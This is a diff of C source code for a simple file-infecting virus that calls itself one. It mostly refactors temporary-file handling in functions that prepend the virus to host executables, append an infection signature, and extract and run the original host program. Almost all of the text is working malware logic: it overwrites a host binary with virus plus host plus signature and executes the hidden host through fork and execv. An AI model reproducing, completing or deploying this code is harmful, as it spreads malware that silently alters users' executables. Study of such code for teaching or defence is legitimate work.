@@ -5,10 +5,10 @@
 #include <sys/sendfile.h> 	// for sendfile()
 #include <sys/wait.h>	  	// for waitpid()
 #include <fcntl.h>        	// for file control operations 
-#include <unistd.h>	  		// for close()
+#include <unistd.h>		// for close()
 
 #define SIGNATURE 4033
-#define SIZE 14064
+#define SIZE 14056
 #define PAYLOAD_MESSAGE "Hello! This is a simple virus!"
 #define TEMP_FILENAME ".tempFile"
 
@@ -121,16 +121,14 @@ void infectHostFile(char* hostFileName, int vfd) {
 	int hostSize = st.st_size;
 
 	int signature = SIGNATURE;
-
-	char* tempFileName = TEMP_FILENAME;
-	int tfd = creat(tempFileName, st.st_mode);
 	
+	int tfd = creat(TEMP_FILENAME, st.st_mode);	
 	// Virus->Host->Signature
 	sendfile(tfd, vfd, NULL, SIZE);
 	sendfile(tfd, hfd, NULL, hostSize);
 	write(tfd, &signature, sizeof(signature));
 
-	rename(tempFileName, hostFileName);
+	rename(TEMP_FILENAME, hostFileName);
 
 	close(tfd);
 	close(hfd);
@@ -140,22 +138,20 @@ void infectHostFile(char* hostFileName, int vfd) {
  * Append signature to the virus 
  */
 void appendSignature(int vfd, char* fileName, mode_t mode, int size) {
-	char* tempFileName = TEMP_FILENAME;
-	int tfd = creat(tempFileName, mode);
+	int tfd = creat(TEMP_FILENAME, mode);
 	int signature = SIGNATURE;
 	lseek(vfd, 0, SEEK_SET);
 	sendfile(tfd, vfd, NULL, size);
 	write(tfd, &signature, sizeof(signature));
 	close(tfd);
-	rename(tempFileName, fileName);
+	rename(TEMP_FILENAME, fileName);
 }
 
 /**
- * Execute the original host program inside this file
+ * Execute the original host program inside this object file
  */
 void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]) {
-	char* tempFileName = TEMP_FILENAME;
-	int tfd = creat(tempFileName, mode);
+	int tfd = creat(TEMP_FILENAME, mode);
 
 	lseek(vfd, SIZE, SEEK_SET);
 	int signatureSize = sizeof(SIGNATURE);
@@ -165,10 +161,10 @@ void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]) {
 
 	pid_t pid = fork();			
 	if(pid == 0) { 			
-		execv(tempFileName, argv);
+		execv(TEMP_FILENAME, argv);
 	}
 	else{					
 		waitpid(pid, NULL, 0);		
-		unlink(tempFileName);
+		unlink(TEMP_FILENAME);
 	}
 }
